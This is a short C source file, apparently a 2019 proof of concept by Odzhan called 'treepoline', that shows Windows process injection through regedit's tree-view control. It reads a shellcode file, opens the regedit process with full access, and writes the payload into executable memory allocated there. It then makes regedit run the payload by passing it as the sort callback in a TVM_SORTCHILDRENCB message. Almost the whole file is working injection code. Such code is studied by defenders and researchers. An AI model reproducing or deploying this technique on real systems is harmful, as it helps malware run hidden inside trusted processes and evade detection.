/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE

#include <Windows.h>
#include <psapi.h>
#include <richedit.h>
#include <commctrl.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;

    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *pic=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

// requires elevated privileges
VOID treepoline(LPVOID payload, DWORD payloadSize) {
    HANDLE        hp;
    DWORD         id;
    HWND          wpw, tlv;
    LPVOID        cs, ds, item;
    SIZE_T        rd, wr;
    TVSORTCB      tvs;
    
    // 1. get the treeview handle
    wpw = FindWindow(L"RegEdit_RegEdit", NULL);
    tlv = FindWindowEx(wpw, 0, L"SysTreeView32", 0);
    
    // 2. Obtain the process id and try to open process
    GetWindowThreadProcessId(tlv, &id);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 3. Allocate RWX memory and copy the payload there.
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 4. Obtain the root item in tree list
    item = (LPVOID)SendMessage(tlv, TVM_GETNEXTITEM, TVGN_ROOT, 0);

    tvs.hParent     = item;
    tvs.lpfnCompare = cs;
    tvs.lParam      = 0;
    
    // 5. Allocate RW memory and copy the TVSORTCB structure
    ds = VirtualAllocEx(hp, NULL, 
        sizeof(TVSORTCB) + sizeof(TVITEM),
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        
    WriteProcessMemory(hp, ds, &tvs, sizeof(TVSORTCB), &wr);
    
    // 6. Trigger payload
    SendMessage(tlv, TVM_SORTCHILDRENCB, 0, (LPARAM)ds);

    // 7. Free memory and close process handle
    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    
    CloseHandle(hp);
}

int main(void){
    LPVOID pic;
    DWORD  len;
    int    argc;
    PWCHAR *argv;

    argv=CommandLineToArgvW(GetCommandLine(), &argc);

    if(argc!=2){printf("usage: treepoline <payload>\n");return 0;}

    len=readpic(argv[1], &pic);
    if (len==0) { printf("invalid payload\n"); return 0;}

    treepoline(pic, len);
    return 0;
}
